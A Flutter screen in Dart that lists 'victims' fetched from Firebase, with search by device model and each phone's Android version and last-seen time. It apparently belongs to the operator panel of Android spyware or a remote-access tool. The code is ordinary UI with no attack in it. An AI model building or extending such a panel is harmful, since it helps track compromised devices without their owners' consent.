import 'package:flutter/material.dart';
import '../../../data/repositories/victim_repository.dart';
import '../../../models/victim.dart';
import '../../utils/async_data.dart';
import 'victim_detail_screen.dart';
// Fetch and display all victim from firebase


class VictimListScreen extends StatefulWidget {
  const VictimListScreen({super.key});

  @override
  State<VictimListScreen> createState() => _VictimListScreenState();
}

class _VictimListScreenState extends State<VictimListScreen> {
  AsyncData<List<Victim>> data = AsyncData.notStarted();
  String searchQuery = '';

  @override
  void initState() {
    super.initState();
    _fetch();
  }

  void _fetch() async {
    setState(() => data = AsyncData.loading());
    try {
      final victims = await VictimRepository.global.fetchVictims();
      setState(() => data = AsyncData.success(victims));
    } catch (e) {
      setState(() => data = AsyncData.error(e.toString()));
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Victims')),
      body: Column(
        children: [
          Padding(
            padding: EdgeInsets.all(12),
            child: TextField(
              decoration: InputDecoration(
                hintText: 'Search by device model...',
                prefixIcon: Icon(Icons.search),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
              ),
              onChanged: (v) => setState(() => searchQuery = v),
            ),
          ),
          Expanded(
            child: switch (data.status) {
              AsyncStatus.notStarted => Center(child: Text('Loading...')),
              AsyncStatus.loading => Center(child: CircularProgressIndicator()),
              AsyncStatus.error => Center(
                child: Text(data.error!, style: TextStyle(color: Colors.red)),
              ),
              AsyncStatus.success => _buildList(data.value!),
            },
          ),
        ],
      ),
    );
  }

  Widget _buildList(List<Victim> victims) {
    final filtered = victims
        .where(
          (v) =>
              v.deviceModel.toLowerCase().contains(searchQuery.toLowerCase()),
        )
        .toList();

    if (filtered.isEmpty) return Center(child: Text('No victims found'));

    return ListView.builder(
      itemCount: filtered.length,
      itemBuilder: (ctx, i) {
        final v = filtered[i];
        return ListTile(
          leading: Icon(Icons.phone_android),
          title: Text(v.deviceModel),
          subtitle: Text(
            'Android ${v.androidVersion} • Last seen: ${v.lastSeen.toLocal()}',
          ),
          trailing: Icon(Icons.arrow_forward_ios),
          onTap: () => Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => VictimDetailScreen(victim: v)),
          ),
        );
      },
    );
  }
}
